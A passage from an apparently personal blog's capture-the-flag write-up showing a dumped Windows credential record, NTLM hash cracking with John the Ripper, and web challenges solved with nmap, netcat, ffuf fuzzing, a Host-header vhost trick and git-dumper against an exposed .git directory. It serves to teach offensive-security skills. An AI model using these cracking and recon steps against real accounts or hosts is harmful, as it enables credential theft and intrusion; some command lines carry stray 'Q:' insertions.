+Session           : Interactive from 1
+User Name         : Rodrigo Gonzales
+Domain            : WORKSTATION
+Logon Server      : WORKSTATION
+Logon Time        : 12/02/2020 22.54.23
+SID               : S-1-5-21-2034586335-2782532192-897599191-1001
+	msv :
+	 [00000003] Primary
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * NTLM     : 8ab015e5cc1302d061dfefe6fb3dce12
+	 * SHA1     : b2ecd0de4dc885e66ac28546558761c5e40a5ce1
+	tspkg :
+	wdigest :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	kerberos :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	ssp :
+	credman :
+</code></pre><p>Let&rsquo;s put this hash to file and try cracking them:</p><pre tabindex=0><code>~$ echo &#34;Rodrigo Gonzales:1001:8ab015e5cc1302d061dfefe6fb3dce12:8ab015e5cc1302d061dfefe6fb3dce12:::&#34; &gt; Q: hash.txt
+~$ sudo john --format=NT -w /usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2020-07-23 08:50) 0g/s 18873Kp/s 18873Kc/s 18873KC/s      markinho..*7¡Vamos!
+Session completed
+</code></pre><p>Maybe we should get better wordlist? Let&rsquo;s try this one: <a href=https://github.com/jvesiluoma/wordlists/blob/master/fin-swe-passwdlist.7z>https://github.com/jvesiluoma/wordlists/blob/master/fin-swe-passwdlist.7z</a></p><pre tabindex=0><code>~$ wget https://github.com/jvesiluoma/wordlists/raw/master/fin-swe-passwdlist.7z
+~$ 7z x fin-swe-passwdlist.7z
+~$ sudo john --format=NT --wordlist=fin-swe-passwdlist.7z hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2020-07-23 08:57) 0g/s 3637Kp/s 3637Kc/s 3637KC/s ..
+Session completed
+</code></pre><p>No bonus. This list was supposed to have the password. However, it might be in cleartext in memory so let&rsquo;s make password list from memory:</p><pre tabindex=0><code>$ cat strings_endian.txt|sort -u &gt; Q: from_memory.txt
+$ sudo john --format=NT --wordlist=from_memory.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+perse500!        (Rodrigo Gonzales)
+1g 0:00:00:00 DONE (2020-07-23 08:59) 20.00g/s 11533Kp/s 11533Kc/s 11533KC/s Perse..\PersistentAddinsRegistered
+Use the &#34;--show --format=NT&#34; options to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>Password for Rodrigo Gonzales is &ldquo;perse500!&rdquo;. The password was supposed to be Perse500, which is on <a href=https://twitter.com/jvesiluoma>jvesiluoma&rsquo;s</a> combination list.</p><hr><h2 id=challenges---q-web>Challenges -> Q: Web</h2><h3 id=discovering-tcp-1>Discovering TCP #1</h3><blockquote><p>Q: What abnormal TCP port is open on target.helsec.fi?</p></blockquote><p>Let&rsquo;s NMAP</p><pre tabindex=0><code>~$ sudo nmap target.helsec.fi -v
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 14:27 EDT
+Initiating Ping Scan at 14:27
+Scanning target.helsec.fi (167.71.0.121) [4 ports]
+Completed Ping Scan at 14:27, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:27
+Completed Parallel DNS resolution of 1 host. at 14:27, 0.00s elapsed
+Initiating SYN Stealth Scan at 14:27
+Scanning target.helsec.fi (167.71.0.121) [1000 ports]
+Discovered open port 80/tcp on 167.71.0.121
+Discovered open port 22/tcp on 167.71.0.121
+Discovered open port 31337/tcp on 167.71.0.121
+Completed SYN Stealth Scan at 14:28, 53.24s elapsed (1000 total ports)
+Nmap scan report for target.helsec.fi (167.71.0.121)
+Host is up (0.038s latency).
+Not shown: 997 filtered ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+31337/tcp open  Elite
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 53.39 seconds
+          Raw packets sent: 2040 (89.580KB) | Rcvd: 1050 (42.037KB)
+</code></pre><p>The port 31337 is not normal.</p><h3 id=discovering-tcp-2>Discovering TCP #2</h3><blockquote><p>Q: Can you interact with the port 31337/tcp on target.helsec.fi?</p></blockquote><pre tabindex=0><code> ~$ host target.helsec.fi
+target.helsec.fi has address 167.71.0.121
+~$ nc -nv 167.71.0.121 31337
+(UNKNOWN) [167.71.0.121] 31337 (?) open
+PLZ ANSWER SOMETHING
+SOMETHING
+flag{INTERACTING_WITH_SOCKETS_IS_EZ}
+</code></pre><h3 id=discovering-udp>Discovering UDP</h3><blockquote><p>Q: What abnormal UDP port is open on target.helsec.fi?</p></blockquote><p>I&rsquo;ve no idea what I&rsquo;ve been thinking when I created the challenge. The listener I coded does not response anything which means there&rsquo;s no way to solve this challenge out. =)</p><p>The answer however was 13.</p><h3 id=web-1>Web #1</h3><blockquote><p>Q: Find the secret admin panel on <a href=http://target.helsec.fi>http://target.helsec.fi</a>.</p></blockquote><p>Let&rsquo;s fuzz the web:</p><pre tabindex=0><code>~$ ffuf -u http://target.helsec.fi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt                                              
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+index.html              [Status: 200, Size: 368, Words: 41, Lines: 18]
+personals               [Status: 301, Size: 169, Words: 5, Lines: 8]
+web-console             [Status: 301, Size: 169, Words: 5, Lines: 8]
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+~$ curl -L http://target.helsec.fi/web-console
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.19.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+~$ curl -L http://target.helsec.fi/personals  
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.19.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>Okay. We found personals and web-console directories, let&rsquo;s continue:</p><pre tabindex=0><code>~$ ffuf -u http://target.helsec.fi/web-console/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/web-console/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+~$ ffuf -u http://target.helsec.fi/personals/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/personals/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</code></pre><p>Nothing :(</p><p>Let&rsquo;s change wordlist:</p><pre tabindex=0><code>~$ ffuf -u http://target.helsec.fi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+/web-console/           [Status: 403, Size: 153, Words: 3, Lines: 8]
+/web-console/Invoker    [Status: 200, Size: 25, Words: 1, Lines: 2]
+:: Progress: [2439/2439] :: Job [1/1] :: 1219 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+~$ curl http://target.helsec.fi/web-console/Invoker
+flag{TH1S_WAS_QUICK_HIT}
+</code></pre><p>Boom, we got a flag: flag{TH1S_WAS_QUICK_HIT}</p><h3 id=web-2>Web #2</h3><blockquote><p>Q: There&rsquo;s a png file on <a href=http://target.helsec.fi>http://target.helsec.fi</a>. Find it.</p></blockquote><p>Let&rsquo;s see if there is png files in the personals directory we found in the previous challenge:</p><pre tabindex=0><code>~$ ffuf -u http://target.helsec.fi/personals/FUZZ.png -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/personals/FUZZ.png
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+whois                   [Status: 200, Size: 40, Words: 1, Lines: 2]
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</code></pre><p>OMG! A photo of me, this can&rsquo;t be good:</p><pre tabindex=0><code>curl http://target.helsec.fi/personals/whois.png
+flag{THANK_GOD_THERE_WAS_NO_PHOTO_HERE}
+</code></pre><p>What the flag says&mldr; flag{THANK_GOD_THERE_WAS_NO_PHOTO_HERE}</p><h3 id=web-3>Web #3</h3><blockquote><p>Q: Check the other project on <a href=http://target.helsec.fi>http://target.helsec.fi</a> as well.</p></blockquote><p>There&rsquo;s some other project mentioned on the front page:</p><pre tabindex=0><code>~$ curl http://target.helsec.fi
+&lt;!doctype html&gt;
+
+&lt;html lang=&#34;en&#34;&gt;
+	&lt;head&gt;
+		  &lt;meta charset=&#34;utf-8&#34;&gt;
+
+		    &lt;title&gt;Target site&lt;/title&gt;
+		      &lt;meta name=&#34;description&#34; content=&#34;This beautiful site was made by whois&#34;&gt;
+		        &lt;meta name=&#34;author&#34; content=&#34;whois&#34;&gt;
+
+	&lt;/head&gt;
+
+	&lt;body&gt;
+		&lt;h1&gt;Target website&lt;/h1&gt;
+		&lt;p&gt;Check my &lt;a href=&#34;http://loremipsum.helsec.fi&#34;&gt;blog project&lt;/a&gt; Q: too.
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>Let&rsquo;s check it:</p><pre tabindex=0><code>~$ host loremipsum.helsec.fi
+loremipsum.helsec.fi has address 127.0.0.1
+</code></pre><p>The domain is pointing to localhost, maybe it&rsquo;s a <a href=https://www.webopedia.com/TERM/V/virtual_host.html>vhost</a>?</p><pre tabindex=0><code>~$ curl -H &#34;Host: loremipsum.helsec.fi&#34; http://target.helsec.fi
+flag{VHOSTS_ARE_OFTEN_USED_IN_HAXXOR_CHALLENGES}
+</code></pre><p>Aaaand we got a flag!!!</p><h3 id=web-4>Web #4</h3><blockquote><p>Q: There&rsquo;s something more in <a href=http://loremipsum.helsec.fi>http://loremipsum.helsec.fi</a>&mldr;. Can you find it?</p></blockquote><p>Time to fuff again:</p><pre tabindex=0><code>~$ ffuf -H &#34;Host: loremipsum.helsec.fi&#34; -u http://target.helsec.fi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Header           : Host: loremipsum.helsec.fi
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
+index.html              [Status: 200, Size: 49, Words: 1, Lines: 2]
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</code></pre><p>OMG, there&rsquo;s a git repo. Let&rsquo;s get it using <a href=https://github.com/arthaud/git-dumper>git-dumper</a>! But first add the vhost to hosts file:</p><pre tabindex=0><code>cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+
+## The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+167.71.0.121	target.helsec.fi loremipsum.helsec.fi
+</code></pre><p>Now we are good to go:</p><pre tabindex=0><code>git-dumper.py http://loremipsum.helsec.fi/.git/HEAD dump
+[-] Testing http://loremipsum.helsec.fi/.git/HEAD [200]
+[-] Testing http://loremipsum.helsec.fi/.git/ [403]
+[-] Fetching common files
+[-] Fetching http://loremipsum.helsec.fi/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://loremipsum.helsec.fi/.gitignore [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/description [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/post-commit.sample [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/post-receive.sample [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/post-update.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-push.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/update.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/info/packs [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/index [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/info/exclude [200]
+[-] Finding refs/
+[-] Fetching http://loremipsum.helsec.fi/.git/FETCH_HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/HEAD [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/config [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/info/refs [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/ORIG_HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/HEAD [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/remotes/origin/HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/heads/master [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/remotes/origin/master [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/stash [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/packed-refs [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/heads/master [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/remotes/origin/HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/remotes/origin/master [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/stash [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/wip/wtree/refs/heads/master [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/wip/index/refs/heads/master [404]
+[-] Finding packs
+[-] Finding objects
+[-] Fetching objects
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/6f/509d1e83a851aa621036f3d0770e44c4969eba [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/d3/e4d4e4aea12282ec91aa6c5888d7bc0969b413 [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/9d/472888c48febd2d52c88109bfae948751ec780 [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/00/00000000000000000000000000000000000000 [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/b6/59f196ba24a08e044fe09c46557dad20a01522 [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/96/8186f4d13375526fed7966fdd783dd6d5bcaef [200]
+[-] Running git checkout .
+</code></pre><p>The directory contains only one file:</p><pre tabindex=0><code>~$ ls dump
+flag.txt
+~$ cat dump/flag.txt
+flag{LEAVING_GITS_OPEN_LIKE_THIS_IS_DANGEROUS}
+</code></pre><p>The flag is: flag{LEAVING_GITS_OPEN_LIKE_THIS_IS_DANGEROUS}</p><hr></div></div></div></div></main><footer class=footer><div class=container><span class=text-muted>&copy; 2024 <a href=/about/whois>Juho Jauhiainen</a>. All rights reserved.</span></div></footer><script src=https://code.jquery.com/jquery-3.5.1.slim.min.js></script><script src=https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js></script><script src=https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js></script><script src=/js/main.js></script></body></html>
